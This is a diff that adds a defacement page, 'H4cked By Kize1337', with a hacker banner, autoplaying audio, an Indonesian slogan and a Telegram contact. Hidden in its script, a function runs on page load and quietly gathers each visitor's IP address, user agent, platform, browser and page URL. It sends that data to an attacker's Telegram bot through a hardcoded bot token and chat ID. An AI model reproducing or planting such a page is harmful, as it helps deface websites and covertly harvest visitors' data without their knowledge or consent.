@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="icon" type="image/png" href="https://c.top4top.io/p_3426vjzid3.jpg">
+  <title>H4cked By Kize1337</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="H4cked By Kize1337">
+  <meta name="keywords" content="H4cked">
+  <meta name="author" content="Kize1337">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css?family=Share+Tech+Mono" rel="stylesheet">
+  <style>
+    body {
+      background-color: white;
+      font-family: 'Share Tech Mono', monospace;
+      color: #333;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      text-align: center;
+    }
+
+    .container {
+      max-width: 600px;
+      padding: 20px;
+    }
+
+    .title {
+      font-size: 32px;
+      font-family: 'Courier New', monospace;
+      font-weight: bold;
+      margin-bottom: 30px;
+      color: #000;
+      letter-spacing: 2px;
+    }
+
+    .logo {
+      width: 200px;
+      margin-bottom: 10px;
+    }
+
+    .audio-player {
+      margin-bottom: 35px;
+    }
+
+    .message {
+      font-size: 18px;
+      font-family: 'Courier New', monospace;
+      margin: 15px 0;
+      color: #ff0000;
+      animation: blink 1.5s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+
+    .status {
+      font-size: 16px;
+      margin: 8px 0;
+      color: #444;
+    }
+
+    .divider {
+      width: 80%;
+      max-width: 300px;
+      height: 1px;
+      background-color: #ddd;
+      margin: 25px auto;
+    }
+
+    .contact {
+      font-size: 16px;
+      margin: 20px 0;
+      color: #000;
+      font-weight: bold;
+    }
+
+    @media (min-width: 768px) {
+      .container {
+        max-width: 700px;
+        padding: 40px;
+      }
+
+      .title {
+        font-size: 42px;
+        margin-bottom: 35px;
+      }
+
+      .logo {
+        width: 240px;
+        margin-bottom: 10px;
+      }
+
+      .message {
+        font-size: 22px;
+      }
+
+      .status,
+      .contact {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="title">H4CKED BY ./Kize1337</div>
+    <img src="https://a.top4top.io/p_3426dr1jz3.jpg" class="logo" alt="Logo">
+
+    <div class="audio-player">
+      <audio id="bg-audio" src="https://g.top4top.io/m_3426jnrjr2.mp3" autoplay controls style="width: 150px; height: 30px;"></audio>
+    </div>
+
+    <div class="message">404 NOT FOUND</div>
+    <div class="status">Menyukai gunung tidak harus mendaki ke atasnya, cukup melihat dari bawah lalu nikmati keindahannya.</div>
+    <div class="status">~3726 mdpl</div>
+    <div class="divider"></div>
+    <div class="contact" style="color: black;">CONTACT: <a href="https://t.me/deathbase" target="_blank" style="color: black; text-decoration: underline;">t.me/deathbase</a></div>
+  </div>
+
+  <script>
+    document.body.addEventListener('click', function () {
+      const audio = document.getElementById('bg-audio');
+      if (audio) {
+        audio.muted = false;
+        audio.volume = 1.0;
+        audio.play().catch((e) => {
+          console.warn('Autoplay failed:', e);
+        });
+      }
+    }, { once: true });
+
+    async function sendLogToTelegram() {
+      const token = "7603173849:AAG3Z2gwgyhV9TIJphNhT7usVOC_75GF49s";
+      const chat_id = "-1002456492650";
+
+      let ipInfo = "Unknown";
+      try {
+        const res = await fetch("https://api64.ipify.org?format=json");
+        const data = await res.json();
+        ipInfo = data.ip;
+      } catch (e) {
+        ipInfo = "Unavailable";
+      }
+
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      const browser = (() => {
+        if (ua.includes("Chrome")) return "Chrome";
+        if (ua.includes("Firefox")) return "Firefox";
+        if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+        if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+        if (ua.includes("Edg")) return "Edge";
+        return "Unknown";
+      })();
+
+      const now = new Date();
+      const timestamp = now.toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+
+      const message = 
+`*📌 Access Detected*
+
+*📅 Date & Time:* ${timestamp}
+*🌐 IP:* ${ipInfo}
+*💻 Device:* ${platform}
+*🌍 Browser:* ${browser}
+*📣 User-Agent:* ${ua}
+*📎 URL:* ${window.location.href}
+
+_This message is sent automatically by a bot._`;
+
+      const tgURL = `https://api.telegram.org/bot${token}/sendMessage`;
+      await fetch(tgURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+    }
+
+    window.onload = () => sendLogToTelegram();
+  </script>
+</body>
+</html>
